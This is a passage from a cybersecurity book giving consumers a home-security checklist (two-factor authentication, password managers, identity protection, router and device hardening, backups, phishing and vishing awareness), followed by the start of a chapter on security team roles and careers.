service agents  often focused on helping them recover and then help prevent similar  issues from occurring in the future.  Mathew Newfield, the Chief Information Security Officer of Unisys,   wrote, “there is a level of apathy and a lack of awareness when it comes to  securing the home office environment. In my conversations with CISOs,  they’re saying that when they're testing their own employees at home now,  they're seeing double the failure rates on their security tests than they saw  pre-COVID.”2 We would like to help change that situation—move from  apathy to more engagement by offering a basic set of defenses.   Consumer Defense Checklist Overview In this chapter, we provide an easy-to-follow “defense checklist.” We  encourage you to be near a computer while you read through the checklist.  This is an action-oriented chapter that we hope will significantly improve  your level of security at home. Our desire is that you implement our advice  as quickly as possible or at least be able to check off the items that you have  already completed as a form of your own personal security audit.   Defense Checklist Our defense checklist for consumers is shown in Table 15-1, and we  provide the reasoning and rationale behind it, including how the checklist  defends against the root causes of breach in Table 15-2. The checklist flows  “outside-in” because there is much more data about you outside of your  home and at many organizations that are outside of your control than are  inside of the devices in your own home.  2 https:  dotcomqa.unisys.com unisys-security-index  364   Table 15-1.

The amount of information about any of us that is available in many online  databases outside of our households and our devices typically far exceeds  the amount of data inside our households and on our devices. As such,  a data breach at any such organization, as exemplified in many of the   367   Chapter 15    adviCe to Consumers  chapters in the first part of this book, has many negative implications to  consumers.  Compromised credit card numbers from retail breaches such as   that at Target can be used to fraudulently purchase goods and services.   Although consumers have limited or no liability for fraudulent purchases,  the fraud can result in quite a bit of inconvenience for consumers.  Stolen  names and email addresses from breaches such as JPMorgan Chase  can be used to conduct spear phishing attacks and take over consumer  financial accounts. A compromised Yahoo email address can be used  to issue password resets of other online accounts that simply rely on  ownership of an email address to prove identity. Identity data stolen from  Equifax can be used by an impostor to apply for credit in an unsuspecting  consumer’s name. The list goes on and on. All of the malicious activities in  these examples are possible due to stolen data that came from breached  enterprise and government organizations. Over 11 billion records have  been breached since 2005, more records than there exist human beings on  the earth.  When such data breaches occur, and organizations become aware   that they have been breached, they may notify consumers that have been  affected. However, organizations often do not report or know that they  have been breached immediately. Yahoo, for instance, did not report that  they had been breached for over two years. Marriott did not know that  Starwood had been breached four years prior to their acquisition. OPM did  not know that they had been breached by a second attacker even though  they had taken steps to kick out a first attacker from their network. Even  worse, some organizations may never know that they have been breached.  Although many breaches are reported, but reported late, there are also  many unreported breaches that have been identified by companies that  monitor stolen records on the dark web.  The next sections describe three things that you can do to protect your   identity online: enabling two-factor authentication, using a password  manager, and signing up for identity theft protection.  368    adviCe to Consumers  Chapter 15   Enable Two-Factor Authentication If you have tried to log in from a new device and were asked to enter a  numeric code that was sent to your phone, you have already used two-  factor authentication. Two-factor authentication helps protect online  accounts even when an attacker has obtained the primary, or first-factor,  used in authentication  typically a password .  When two-factor authentication technology was first introduced, it   was costly and required a hardware token, mostly available and affordable  to large enterprises. The good news is our smartphone has replaced the  hardware token, and we now have multiple easy options to choose from  that either require an app  more secure  or a simple one-time code sent via  SMS  less secure .  We provided details on various forms of two-factor authentication  and how they work in Chapter 12, but the main point here is that there  are free options: receive a text message with a one-time pin or use a free  authentication mobile application that provides a rotating number of  digits to enter. Having this second form of authentication  something that  you have  in addition to the username and password  something that you  know  significantly reduces the risks of phishing attacks.  The following are some concrete next steps that you can take:     Enable two-factor authentication across all of your   sensitive and critical accounts. Begin with your  banking, 401K, and investment accounts. Those are  some of the most valued and have money that you  would not want to disappear. As long as you have a  mobile phone, you have an inexpensive way to enable  more robust security.  369   Chapter 15    adviCe to Consumers      If you plan to primarily use the SMS option for  authentication, we’d recommend that consumers  protect themselves against SIM swapping by making  sure they have a strong verbal password in place with  their wireless carrier. This effectively prevents against  an account takeover. Attackers are known to defeat  two-factor codes sent to SMS by taking over your  account with your wireless carrier and then having  such two-factor codes routed to them.     Do not leave any device unsecured without a password  and open to the world. Apple and Microsoft have made  it easy to log in using just your thumb or index finger.  Ensure every device has a password or code that is not  easy to guess or crack. Use a passcode on your mobile  phone. For iOS phones, use TouchID and FaceID. On  Android, use Fingerprint Scanner and Trusted Face  Face Unlock features. Consider using a security key   such as YubiKey  or similar feature.   Use a Password Manager In addition to all of the large data breaches we have described in this book  in which PII has been stolen, many data breaches have involved the theft  of password credentials  e.g., LinkedIn breach of 117 million passwords  in 2012, Under Armour MyFitnessPal breach of 150 million passwords in  2018 . Many of those credentials are bought and sold by cybercriminals  on the “dark web.” What that means to consumers is that the older the  passwords that you’ve been using, the higher the likelihood that those  passwords are known by attackers on the dark web and will be used to  access your information. As such, we recommend that you use a good  password manager to generate strong and unique passwords for each site  that you use and that you change passwords for any site that is breached.  370   Chapter 15    adviCe to Consumers  A password manager allows you to choose a master password that is  used to encrypt all your other passwords and stores only an “encrypted”  version of your master password that is sufficiently impervious to being  breached itself. However, if your computer is infected with keylogging  malware, an attacker can acquire your master password when you enter  it. Hence, we discuss the importance of running an anti-malware solution  later in this chapter, as an important defense to use together with your  password manager.  Some options for password managers are 1Password, Dashlane, and   LastPass. Following are some concrete next steps that you can take:     Use a password manager that works across all of your  platforms and devices. The password manager is great  at storing your many passwords and also generating  long complex passwords. These passwords are difficult  to crack, and you don’t have to remember them all  because you will rely on your password manager to  provide them as you need them.     One of the benefits of a password manager is the   intelligence you get by analyzing all of your passwords  and even matching them with known breaches, as  shown in Figure 15-1.     Do not reuse the same passwords across your digital   services. We realize this recommendation is easier said  than done. Password managers will help you generate  strong, diverse, and distinct passwords for each site  that you use. By doing so, a password breach at one  organization will not allow attackers to breach your  accounts at other organizations.  371   Chapter 15    adviCe to Consumers  Figure 15-1.  “WatchTower” feature from the 1Password Password  Manager console  To determine which passwords may be the most critical to leverage  a password manager first, we encourage consumers to visit the “Have I  been pwned?” website  https:  haveibeenpwned.com   to check if you  have an account that has been compromised in a data breach and which  ones. The site maintains a data store of all hashed passwords that have  been stolen in prior breaches. For each such account that has already  been compromised, consumers should change their passwords for those  online accounts if they have not done so already and enable two-factor  authentication if offered. Most consumers are shocked by the amount  of data that has already been compromised without ever fully knowing  the impact and the reach. The hope is that both consumer services and  enterprises check passwords against all the ones that have been stolen  from past breaches and encourage users to choose new ones.   Credit and Identity Protection Based on estimates of the number of records stolen  over 11 billion  in past  mega-breaches and the number of consumers who have identities worth  stealing, there is a relatively high chance that any identity worth stealing  has already been stolen multiple times.  372   Chapter 15    adviCe to Consumers  As such, consumers should have their credit files frozen most of the   time when they are not actively applying for loans or new credit cards  and sign up for identity protection services. Such services monitor many  data sources, including credit files, the dark web, new account or loan  applications, payday advances, home title registrations, and social media,  for indications that a consumer’s personal information is being used or  abused. When signed up for such monitoring and protection services,  consumers can receive alerts when an activity associated with their  identity takes place and can indicate whether it was indeed them who  initiated the activity or not. If not, steps can then be taken to close any  fraudulent accounts that may have been opened, and the authorities can  be notified. In some cases, fraudsters can be caught in the act in the case of  buying a car, opening a bank account, or taking out a loan with someone  else’s identity if the alert is acted on fast enough.  What many identity theft protection providers do is have their systems   continuously search for your key identifiers and “metadata” about your  identity  e.g., social security, date of birth, etc.  across many data sets  that are refreshed daily and sometimes in near real time. Unless you are  constantly searching public and private records of yourself, it is difficult  to know when your personal information may show up compromised on  them. Many harmful and financially insidious attacks could be prevented  by enrolling in a service that is constantly monitoring and scouring  the Internet and dark web for anything related to your identity. Should  someone successfully steal or create a “synthetic”  partially real partially  fake  identity based on you, identity theft protection will go to work and  help you resolve and restore your credit and identity.  Note that we make a distinction between simple credit monitoring  and identity theft protection. Credit monitoring is a subset of identity  theft protection, which tracks just credit data and the movement of your  credit score as reported by the three major bureaus in the United States.  In addition, credit monitoring also alerts if and when something “hits”   373   Chapter 15    adviCe to Consumers  your credit file that is maintained by the three major credit bureaus in the  United States. There are many, many forms of identity theft that do not  involve or impact your credit records.  Some identity theft protection services also provide stolen funds   reimbursement. If someone uses your identity to defraud you, and the  identity theft protection provider cannot successfully work with financial  or other institutions to recover your money, the provider will write you a  check for all funds that were stolen up to a specified amount  e.g., $25,000  on a basic plan or $1,000,000 on a premier plan . Such reimbursement  is provided with the backing of an insurance company. Stolen funds  reimbursement is more powerful than a “service guarantee” in which  some providers just pay for experts  attorneys, etc.  to help you in the case  that you have an identity theft event, as opposed to actual dollar-for-dollar  reimbursement in the case that your actual money cannot be refunded.  Not all identity protection services provide stolen funds reimbursement— sign up with one that does.   Protect the Gateway to “Close the   Front Door” Most consumers are given or buy a home Internet router  also called a  gateway  from their Internet service provider. In 2019, the FBI issued a  warning “that hackers can use that innocent device  unprotected  to do a  virtual drive-by of your digital life.” They’ve found an increase in attacks  in which “Unsecured devices can allow hackers a path into your router,  giving the bad guy access to everything else on your home network that  you thought was secure. Are private pictures and passwords safely stored  on your computer? Don’t be so sure.”  Your Internet router or gateway is the first line of defense inside your   home, as it is the primary way that all of your home devices get connected  to the outside world. Anything malicious must first get into your network   374   Chapter 15    adviCe to Consumers  through the Internet gateway which is why we consider the gateway to be  the front door to everything else.  We often receive the Internet router as part of the Internet provider’s   hardware they allocate during the installation, or perhaps we buy the  router and wireless access points separately. We unbox the devices, set  them up, and never think about them again. Until there is an issue with  connectivity, most consumers are not actively managing the security  of gateway. Many routers are left wide open, with weak authentication  protocols and with the default username and password as “admin” and  “admin.” The following are a few fundamental steps you can take to protect  the front door to your home network:     Buy a secure router and wireless network. We have  written about the importance of built-in security in  previous chapters, and there are providers on the  market that provide great wifi  mesh  technology  and also make it secure by default. Products such as  Google Nest Wifi are among the best and require little  maintenance. Eero is another provider that aims to  provide greater security, ease, and great wifi that covers  the entire home. Also for increased privacy, there are  Plume pods.      If you decide to stick with a more traditional router, that  can work too, but just know you will need to change the  password to a complex one  not the default  and log  in on a monthly basis to ensure the router’s firmware  is current and that no security vulnerabilities exist.  If there is an ability to auto-update, that should be  enabled. Most new operating systems and applications  have that set to auto-update by default. Older operating  systems did not.  375   Chapter 15    adviCe to Consumers     Change the default SSID  “router name”  to make it   more difficult to identify your device and ensure it does  not represent anything identifiable, such as your name  or address.     Ensure that Wi-Fi Protected Access 2  WPA2  is the  encryption type you’re using. WPA2 is currently the  most secure and most recent form of encryption  available, as of the writing of this book. You should  always select WPA2 if it is available. It not only  scrambles the encryption key but it also does not allow  the use of Temporal Key Integrity Protocol or TKIP  which is known to be less secure than AES.   Protect the Endpoint Once we have improved the first line of defense, the Internet router   gateway , we need to harden the endpoints. An endpoint is any device  that connects to the Internet through your router or gateway. In addition  to laptops and mobile phones, endpoints also include the many Internet of  Things  IoT  devices like Ring, Nest, digital photo frames, light bulbs, smart  TVs, and Alexa and Google Home voice-activated devices.   Run Anti-malware For any device that is powerful enough and configurable enough, run an  anti-malware package. Install an anti-malware software package that is  preferably a paid service that includes advanced security features. There  are many free offerings on the market, but the old adage “if you aren’t  paying for the product, you are the product” is true among anti-malware  offerings as well. If you are using a free anti-malware product, chances  are that the supplier is selling data about you, your browsing habits, or   376   Chapter 15    adviCe to Consumers  potentially more to advertisers or other third parties in order to fund the  development of their anti-malware product.  There have been lots of innovative solutions in the anti-malware space   that have gone far beyond the classic signature-based anti-virus software  of the 1980s, and they offer many other protections in one package. For  example, Norton 360 with LifeLock Select offered in 2021 provides a filter  for phishing websites, protects against ransomware attacks, provides a  firewall  for PCs and Macs , and provides identity theft protection all in  one package.  Finally, use a web browser that has safe browsing protections which  warn you when you are about to hit sites that are infected with malware  drive-by-downloads or could be phishing sites. Google Chrome and Apple  Safari, for instance, provide automatic checking of each and every URL  a consumer visits against a regularly updated list of known malware and  phishing sites.   Encrypt Your Data Data encryption makes it very difficult for attackers to get at your cleartext  data without having your password or PIN credentials. Your endpoint  becomes far more secure when you enable the data encryption on your  device. If your endpoint device is lost or stolen, your data is less likely to be  stolen if the data is encrypted.  Most major operating systems offer a free, built-in storage layer   encryption. So, you no longer need to purchase additional software to  maintain and manage to benefit from encryption. For laptops, Apple’s  FileVault allows for full-disk encryption which uses strong XTS-AES-128  encryption with a 256-bit key to help prevent unauthorized access.  Microsoft also offers storage layer encryption through BitLocker. For  mobile devices, Apple’s iPhone enables encryption whenever a PIN or  passcode is selected for the device, or TouchID is enabled. Similarly,  Android phones can have encryption enabled once a PIN is selected.  377    adviCe to Consumers  Chapter 15   Back Up Your Data There are many options that exist to ensure your data is protected by  storing a backup copy of your data. Although you can always manually  copy data from one disk drive to another, such a process is manual, can  miss important files, and can be rendered ineffective if there is a fire,  flood, burglary, or accident that impacts the backup drive. Rather, it  can be much more effective to back up data to a cloud service, such as  Box, Dropbox, Google Drive, or so on. Such services store data in highly  secure data centers and also typically replicate your data in multiple data  centers such that if data were to be corrupted at one data center, backup  copies of the data will exist at other data centers. Cloud and SaaS services  can provide such backup capability at a cost that can typically be much,  much more effective than any consumer could replicate. Such services  can automatically back up any files placed into a given folder or even be  configured to back up an entire hard drive. Consider using such services  the digital analog of storing money in a bank instead of under your pillow  or mattress!  There are, of course, some potential disadvantages to storing data in  the cloud. Firstly, a cloud provider could have a data breach themselves,  either through inadvertent data exposure or due to an attack. In addition,  once your data is stored in the cloud, should you ever want to delete it, the  cloud provider is hopefully using a secure delete algorithm that overwrites  your data with garbage bits multiple times. If not, and the cloud provider  eventually sells, throws out, or gives away the disks on which your data is  stored, your data could potentially be recovered by an unauthorized party.  When one stores money in the bank, there are risks as well—a robber can  steal the money from the bank, or the bank could go out of business itself.  However, most people feel safer storing their money in the bank instead of  under their mattress. Similarly, most consumers are likely to have better  protection for their data by storing it in the cloud than trying to securely  store it themselves.  378   Chapter 15    adviCe to Consumers  We recommend that after setting up a cloud backup, you regularly  test that you can recover files stored on the cloud. Many enterprises set  up backups, but then find that when they actually need to recover files,  they are unable to do so because the backup is misconfigured, or some  other problem prevented backups from being stored or retrieved. To run  such a test, try downloading your files from another computer using your  credentials for the cloud backup site. Do so regularly. If you are unable to  do so for any reason, you may have to fix whatever configuration problem  may exist.  Finally, sophisticated ransomware has started encrypting or deleting   backups and exfiltrating data instead of just encrypting the primary copies  of files. To thwart such sophisticated malware, cloud backup should keep  an immutable revision history of all files backed up. By doing so, even if  ransomware encrypts files and stores a new version or deletes a file, the  previous version or versions of the file that still exist can be recovered.   System Updates Your computer may periodically ask you to update your operating system  and reboot. Such messages can surely be inconvenient when you are  trying to get work done, and having to reboot your machine often results  in at least several minutes of lost productivity. However, your computer is  asking you to do so because there may be critical security updates that may  need to be installed to patch vulnerabilities that could allow an attacker to  completely take over your machine. Your computer may allow you to delay  the patching for some time but may eventually force you to install the  patch and reboot. One way to approach patching as part of good hygiene   just like brushing your teeth regularly and cutting your nails  is to install  updates perhaps at the end of the working day and reboot once per week.  That way, your computer is being regularly updated, mitigating risk of  attack, while not overly impacting your productivity. Every now and then,  there may be a system patch or reboot that may be required in shorter   379   Chapter 15    adviCe to Consumers  order, say, in the case of the aggressive spread of a worm, but most of the  time patches can be installed once a day, and reboots can be done once  per week.  Ensure that both your operating system and applications are updated   regularly. Many operating systems and applications offer the option to  keep the systems auto-updated—a great choice for folks that have modern  systems and few legacy applications. As vulnerabilities are discovered and  new patched software is released, you can be sure that your endpoints  and applications will stay current and impervious to attack due to known  vulnerabilities.   Protect Your Interactions This last section finally has to do with how we behave and interact with  others online and offline. By this point, we hope that you were able to  apply the checklist to improve the security of the different technologies  that you use each day from your router to the endpoints. Now we focus on  addressing another major source of breach—social engineering tactics.  Social engineering tactics are used in phishing attacks but are also used  in many other sorts of related attacks. For instance, vishing is a play on  phishing in which potential victims are contacted by phone.  In any single week, one may receive multiple inbound calls, some  from numbers that appear as “local” to us, so they lower our defenses,  but these calls are mostly “vishing” or voice phishing. Your name and  phone number may have been stolen from one of large Facebook or other  breaches. Vishing is similar to phishing, but it adds another element, a real  human on the other line trying to persuade to take some action or disclose  some data point. Sometimes, the person on the phone is pleasant; other  times, they are aggressive and sound agitated with us. Both tactics  honey  and vinegar  work, so the criminals use both to see which one you will  most likely respond to. Just keep in mind the old adage “if it sounds too   380   Chapter 15    adviCe to Consumers  good to be true, it probably is!” to calls that attempt to use honey, and do  not get scared or intimidated into engaging with callers that attempt to use  vinegar.  To keep it simple, we urge employees and consumers to follow a “zero   trust” model online and offline and always authenticate the identity of  anyone with which you interact. It is most preferable never to provide any  sensitive information to anyone that calls you, as caller ID information can  easily be spoofed. Rather, if you receive a call from someone claiming to be  from a bank, or the supposed IRS, take down a message, and then call back  the institution at the phone number that you are regularly used to getting  in touch with them.  By applying zero trust in how you interact, you reduce the need to have  to make decisions on the fly, in real time as to whether this call, text, email,  or SMS message is a legitimate one. No reputable institution, official local  state government, or company will use the phone to gather information  in that matter—regardless of how many arrest warrants or tax penalties  you’ve been threatened with!  When in doubt, the best approach is to thank the person and ask   them to send you a written communication by postal mail based on the  information they have on file.  Never volunteer or confirm anything.   The following is a small sample of the representative types of   interactions that you need to avoid and never respond to, as they are most  likely tactics that leverage some form of social engineering to dupe you  into a scam of some sort. The first two are phishing, and the remaining two  are vishing:     An email from your “CEO” requesting you buy Apple   Gift Cards as business gifts for clients.     An email from your bank requesting you log in and   update some information or you will lose access to your  account.  381   Chapter 15    adviCe to Consumers          Inbound phone calls requesting information or offering  you a gift or free holiday.  IRS or other federal agencies calling about a delinquent  payment or some other urgent matter.  Register your cell phone number with the National Do Not Call   registry at www.donotcall.gov. Even though criminals and unscrupulous  telemarketers, of course, ignore the list, if you are on the list and get a call  from a supposed telemarketer, that could be a tip that the offer is fake and  malicious. Most legitimate telemarketers obey FTC regulations and laws  about contacting consumers.  Protecting your interactions means that we move online with caution  and take a moment to pause and think about whether or not an attacker  may, for instance, be attempting to take over one of your online accounts.  What makes phishing and other attacks so damaging is the easy ability to  take over an account and “own” the victim’s most important digital and  physical assets.   Summary In this chapter, we shifted our focus to applying the root causes of major  data breaches to protecting oneself in the digital world. The Internet  will continue to play a vital role in our lives, and by applying the seatbelt  analogy, we are able to have a safer experience every time we connect one  of our many devices and interact online.  Start by protecting your identity online by protecting access to   your online accounts through two-factor authentication and password  managers. Freeze your credit when you are not applying for loans or  credit cards and enroll in identity protection instead of just plain credit  monitoring such that you can protect assets and not just credit lines.  Secure your home router, in addition to all the endpoint devices in your   382   Chapter 15    adviCe to Consumers  home—not just your mobile phones and laptops but all the Internet of  Things devices in your home. Use anti-malware software, encrypt the data  on your devices, and make online backups of your sensitive data. Keep  your software and devices up to date with the latest security patches. And,  finally, be careful in all your online and offline interactions so that you can  avoid falling for social engineering tactics that attackers often employ.  Although most people do not have teams of security engineers   who can help protect themselves the way that many organizations do,  we have provided a checklist of simple and relatively cost-effective  countermeasures that consumers can employ to do the equivalent of  putting on their digital seatbelts to protect themselves in a dangerous  online world. Buckle up and stay safe!  383   CHAPTER 16  Applying Your Skills  to Cybersecurity  Take time to deliberate, but when the time for action comes,  stop thinking and go in.  —Napoleon Bonaparte  This chapter encourages you to join the field of cybersecurity to   leverage your existing skills and everything that you have learned in this  book about the root causes of data breaches and how to fight them. The  cybersecurity field is one of the highest growth fields and most deeply  needed professions with hundreds of thousands of open positions in the  United States and millions of open positions worldwide.1  The US Bureau of Labor Statistics estimates the number of open   Information Security Analyst positions to be approximately 130,000 and  that the profession will grow by 31%, much faster than the 4% for the  average profession from 2019 to 2029. Figure 16-1 shows an increasing  number of organizations reporting a shortage of cybersecurity skills, from  42% in 2015 to 52% in 2019.  1 As per statistics from CyberSeek and Cybersecurity Ventures.

Percentage of organizations reporting a shortage of  cybersecurity skills  Source: Enterprise Strategy Group, n=327   There are many types of cybersecurity roles that are required—not just   deeply technical cybersecurity hackers or engineers. To achieve security  in an organization, a variety of roles are required. We will describe some of  those roles in this chapter and also what people in those roles specifically  do to help combat the root causes of breach.   An Example Security Team We start this chapter by describing how a representative information  security team in a medium-sized company might be organized and discuss  roles in each of the sub-departments. Table 16-1 shows some examples of  the types of roles that are needed in each department in addition to which  root causes of breaches each department focuses on, and Figure 16-2  shows an example organization chart.   386   Chapter 16    applying your SkillS to CyberSeCurity  Table 16-1.  Information Security Roles by Department  Department  Root Causes  Roles  Compliance  all2  third-party risk  third-party Compromise or  abuse  Corporate Security  engineering  all  Software  application  Security  Software Vulnerabilities  iaM  threat intelligence  phishing, Malware, inadvertent  employee Mistakes  phishing, Malware, third-party  Software Vulnerabilities  Cybersecurity analyst information Security analyst Cybersecurity Specialist  technician internal auditor  Corporate Security engineer Security architect Cybersecurity engineer  Security architect Software Security engineer application Security engineer product Security engineer Cybersecurity engineer Security product Manager  SoC analyst Cybersecurity analyst information Security analyst Cybersecurity Specialist  technician  2 All = unencrypted data, phishing, malware, software vulnerabilities  1st and 3rd  party , third-party compromise or abuse, and inadvertent employee mistakes   other than phishing   387   Chapter 16    applying your SkillS to CyberSeCurity  Figure 16-2.  An example information security team organization in  a medium-sized company  Note that the description in this section is only meant to be an   example, as each organization will have its own needs and may decide on  a structure that works best. After describing how an example information  security team in a medium-sized company might be organized and roles in  each of the departments, we then comment on how information security  teams might be structured in larger as well as smaller companies.   Reporting Relationships In a medium-sized company, an information security team may be  composed of a couple dozen people. The head of security may be a CISO  and ideally should report directly to the CEO. In the past, CISOs often  reported to CIOs, but companies with more mature information security  programs realize that security is not just an IT problem. In addition, the  CISO’s team often has a responsibility for vetting the work of the CIO’s   388   Chapter 16    applying your SkillS to CyberSeCurity  team with regard to achieving security and compliance for other IT-related  activities  e.g., patching . Hence, a CISO that reports directly to the CEO  and is a peer of the CIO is likely to be more successful in their role. Direct  line of reporting to the CEO means that the CEO may also acknowledge  the importance of security as something they have end accountability  for in today’s world of data breaches and increasing regulatory penalties.  The direct line of reporting may also be helpful in allowing the CISO to  negotiate for a larger budget than otherwise, based on educating the CEO  about the outstanding risks.  Although having a CISO report directly to a CEO is most preferable for  accomplishing security goals, alternatives can include the CISO reporting  to a CTO, General Counsel, or Chief Risk Officer  CRO . Note that the head  of security can be an executive with an officer-level role but can also be a  vice president or director-level position, based on the scope of the role in  the organization, and may perhaps only use the CISO title externally. That  said, CISOs that are seasoned executive enablers or technology leaders  typically enjoy direct interaction with and influence on both the CEO and  the Board even if they are VPs or director-level positions.3   Governance, Risk, and Compliance Under the head of security, irrespective of where they report into, there can  be three sub-departments in a medium-sized company: GRC  governance,  risk, and compliance , Security Engineering, and Security Operations,  ideally with a leader for each sub-department. The GRC department is  typically responsible for ensuring that the company is compliant with all  information security standards that it needs to be to conduct its current or  future business. The GRC department is also responsible for managing risk  due to all third parties, including suppliers, potential acquirees, partners,   3 See the CISO Report at www.synopsys.com blogs software-security 2018- ciso-report  for more information.  389   Chapter 16    applying your SkillS to CyberSeCurity  and customers. For instance, if the company takes credit card numbers  on its website  and does not fully outsource credit card processing nor  store any credit card data internally , then it may need to satisfy PCI  DSS  Payment Card Industry Data Security Standard . The Compliance  sub-team that is part of the GRC organization would be responsible for  preparing the company for all external audits and coordinating with  external auditors as needed to reduce the administrative load such audits  place on the rest of the company.  The Third-Party Risk sub-team may have to vet all third parties that  the organization works with itself or hire third-party contractors to help,  especially in the case that the organization is considering acquiring  another company. In such cases, if the organization is a public company  whose stock is traded on public markets  e.g., NASDAQ, NYSE, etc. , it  may be desirable that information about potential acquisitions typically  be restricted to the smallest set of employees possible to defend against  potential insider leaks, but also because such employees may then be  restricted from buying or selling company stock. Such restrictions need  to be in place because the trading price of company stock can be affected  when an acquisition closes, and information about a potential acquisition  is considered “insider” information  also sometimes called material  nonpublic information . Note that irrespective of who the head of security  reports into, they should be made aware of any potential acquisitions the  company is considering making so that they can ensure the acquisition be  vetted from a security perspective, inform the business of the level of risk  involved in making the acquisition, and put plans in place to mitigate the  risk. The true costs of mitigating identified risks in an acquisition target  can be easily overlooked or underestimated. The first time that the head  of security hears about an acquisition should not be after the deal has  closed!  390   Chapter 16    applying your SkillS to CyberSeCurity   Security Engineering The next department in the team that we will cover is security engineering,  which can consist of two sub-departments, one to handle the engineering  of security mechanisms internal to the company, corporate security  engineering, and one to handle the engineering of security mechanisms  in any products or services that are released externally. In a company that  creates software products as the main line of business, a separate team may  be required to secure their products from software vulnerabilities—that  team is typically called product or application security engineering. The  corporate security engineering team usually helps choose products from  security vendors to address the root causes of breach and integrates them  into a company’s enterprise infrastructure. The product or application  security team consists of security engineers who collaborate with software  engineers across the company to address first-party vulnerabilities. They  conduct security design reviews, conduct static and dynamic analysis,  manually review code if and when needed, and or conduct penetration  tests prior to release. Note however that software security practices are not  only important for software products that get released externally but are  also important for the company’s internal systems.   Security Operations The third sub-department is Security Operations, which is often  responsible for day-to-day, tactical, and logistical security activities.  Four example security functions carried out by a security operations  team include identity and access management, threat intelligence, SOC   security operations center , and incident response. Identity and access  management staff is responsible for approving or denying employees  access to corporate systems. They may also be responsible for providing  initial access when new employees join and disabling that access when  employees are terminated.  391    applying your SkillS to CyberSeCurity  Chapter 16   Threat Intelligence The threat intelligence team typically gathers data from a variety of sources  on threats that may impact the organization’s security posture. There  are many security vendors on the market that, for instance, supply data  feeds of malicious URLs and signatures of malware that could be used to  identify when employees may browse to phishing sites or sites infected  with malware. There are many external sources of threat data on indicators  of attack  IOAs , indicators of compromise  IOCs , and data feeds on  new software vulnerabilities—some provided by vendors and others that  report into the National Vulnerability Database. Such data can be used for  vulnerability management, to stay abreast of the latest zero-days or critical  patches that are available. In addition, there exist sources of data on  physical threats in particular geographies, and security teams can use that  data to advise employees on their travel plans.   Security Operations Center  SOC  The SOC team is critical to the day-to-day operations of avoiding breaches.  Even though all threats and attacks cannot be prevented, the SOC team  typically can take a variety of actions to contain and recover from attacks  that are detected. The SOC team is usually made up of a team of analysts  that can take steps to mitigate attacks, and we describe the responsibilities  of SOC analysts in more detail in the next section in this chapter.   Incident Response The incident response sub-team in security operations can be either  a virtual or a dedicated team that focuses on mitigating high-priority  incidents that have been escalated by SOC analysts or multi-week or multi-  month incidents that are in progress. An incident is typically an event   392   Chapter 16    applying your SkillS to CyberSeCurity  in which there may have been a violation of an organization’s security  policies, and there may need to be an investigation that takes place to  assess whether or not that has taken place and how to mitigate the event.  A virtual incident response team is one in which members of the team are  pulled together from other departments perhaps only as needed, whereas  a dedicated team is made up of employees who only focus on incident  response. As you can imagine, the smaller the organization, the more likely  the incident response team is virtual, whereas the larger the organization,  the more likely a dedicated team may be necessary.  One of the typical challenges is that if an incident response team is  virtual, then people and resources are pulled away from, say, proactive  security engineering work when an incident is taking place, thereby  making it more likely that there could be more incidents in the future.  However, suppose a dedicated team is in place. In that case, proactive  security work that is preventative and focused on eliminating specific  incidents can proceed more quickly. This dedication creates a positive  reinforcing loop that reduces unplanned work and incidents altogether.  For instance, if a machine gets infected by malware, one could manually  have a member of an incident response team investigate and pull the  machine offline, or an automated program that was proactively engineered  could identify how likely the detection is to be accurate and automatically  block the network from communicating with the infected machine. Information security teams in larger companies have some key   differences. They, for instance, may not have a GRC sub-team to  handle compliance. In the most mature companies, there may exist a  risk organization that is completely separate from the security team,  potentially headed by a Chief Risk Officer. Enterprises have many types  of risks—competitive risks, regulatory risks, financial risks, supply  chain risks, compliance risks, and so on. A risk organization in a larger  company is responsible for enterprise risk management  ERM  which  encompasses such risks, of which information security risks are just one  type. Also, in organizations that are large enough, especially financial   393   Chapter 16    applying your SkillS to CyberSeCurity  institutions, there exists an internal audit team that conducts full audits  as per a variety of compliance standards to identify potential issues well  prior to an external audit.  Also, in a larger company, there may be various satellite application   security teams in addition to a central, core application security team  aka  software security group . The centralized application security team may be  part of the information security team, but application security engineers  may also be embedded in various software development teams across the  company. As it may be challenging for a centralized application security  team to have visibility into each and every design or implementation  decision that takes place in software development, it is typically much  more scalable to distribute application security engineers across software  development teams, especially in a “DevSecOps” environment. If enough  application security engineers are not available, which is often the case,  one of the engineers from each software development team can be trained  and appointed to be the local application security champion, and such  local application security champions may coordinate with the central  application security team.   Getting a Job in Cybersecurity For those of you who are inspired to consider a career in cybersecurity,  understanding the basics of information technology can be helpful. In  particular, having a basic background in networking, cloud infrastructure,  operating systems, software engineering, databases, cryptography, and  artificial intelligence can be very helpful.  Consider the following analogy—imagine you were hired to secure and   protect a home. First, you would need to understand how each door and  window operated, and have an inventory of all the different entrances into  and outside of the home. By understanding the fundamentals of the house,  you can begin to create a strategy for how to best secure it. However, if you   394   Chapter 16    applying your SkillS to CyberSeCurity  did not fully understand how the windows moved—did they slide up and  down or from left to right—it would make It harder to choose the right set  of sensors to detect if they are opened. Also, depending upon the number  of windows and how they are laid out, determining which locations glass  break sensors should be placed might be challenging. Similarly, without  the basic understanding how computer systems are architected, it would  be hard to secure them. Understanding which parts of the system take  input, for instance, is critical as attackers often try to feed in malicious  input that is either malformed or specially crafted to take advantage of  software vulnerabilities. Where input comes from, what assumptions  if  any  can be made about that input, as well as how those assumptions  change as the system evolves over time are important to understand.  That said, you certainly do not need to get a full computer science   degree or become an expert in all of those areas to enter the field of  cybersecurity. Once you are armed with a basic understanding of  information technology, the next step is to make sure you understand the  foundations of information security. The combination of Neil’s last book  Foundations of Security  Apress, 2007  and this book provides both the  foundations and conceptual background required to get started in the field  as an analyst. Online courses are also a great resource.  When the authors began their careers, they had two primary choices to   learn and advance in their careers:  1  purchase many bulky books, read,  study, and practice, or  2  spend tens of thousands of dollars or more on  courses, bootcamps, and formal in-person education. The Internet has  provided a rich and affordable alternative where you can get the immersive  classroom experience of being taught by the best teachers while doing it  from home. For example, Stanford Online has an excellent course on the  Foundations of Information Security.  If you already have an understanding of the fundamentals and are in  the IT or software fields, you can consult Table 16-2 to determine future  information security career options based on your current role.  395   Chapter 16    applying your SkillS to CyberSeCurity  We now explore what would be required to grow into three possible   representative career paths in information security: SOC Analysts, Security  Architects, and CISOs. Although an entire book could be written about  how to follow each of the three career paths that we describe, we provide  only some initial direction in this chapter.  There are of course many other roles from Table 16-2 that are   important to security beyond the three that we will discuss in detail. For  instance, cybersecurity analysts, project managers, and product managers  are just examples. If you have expertise in other fields, there are many ways  to apply your expertise to cybersecurity. For instance, if you have worked  in financial institutions as someone who assesses credit risk  i.e., assessing  the likelihood that someone may or may not pay back a loan , then  becoming a 